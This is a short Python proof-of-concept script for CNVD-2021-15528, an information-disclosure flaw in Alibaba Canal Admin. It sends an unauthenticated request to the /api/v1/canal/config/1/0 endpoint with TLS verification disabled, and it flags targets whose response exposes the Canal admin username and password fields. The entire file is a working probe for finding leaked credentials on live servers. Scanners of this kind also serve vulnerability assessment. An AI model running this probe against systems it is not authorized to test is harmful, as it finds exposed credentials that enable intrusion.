# title: Alibaba Canal存在信息泄露漏洞
# cve-id: CNVD-2021-15528
# author: jgz
# title="Canal Admin"

from poctools import BasicPoc
import requests


class Poc(BasicPoc):
    def __init__(self):
        super(Poc, self).__init__()
        self.name = ""
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Aoyou/biEzMm5kNDRrWTcgazFsTEFTYejkYHK-l5UHLC1JPOhy_B1sefJvAsiTZA=='}
        self.timeout = 20

    def verify(self, url: str) -> bool:
        target = url.strip("/")
        target_1 = f'{target}/api/v1/canal/config/1/0'
        try:
            response_1 = requests.get(target_1, headers=self.headers, timeout=self.timeout, verify=False)
            if response_1.status_code == 200 \
                    and "canal.admin.user" in response_1.text \
                    and "canal.admin.passwd" in response_1.text:
                return True
        except Exception as err:
            pass
        return False


if __name__ == '__main__':
    url = "https://127.0.0.1:9091/"
    poc = Poc()
    result = poc.run(url)
    print(f"{url} -> {result}")
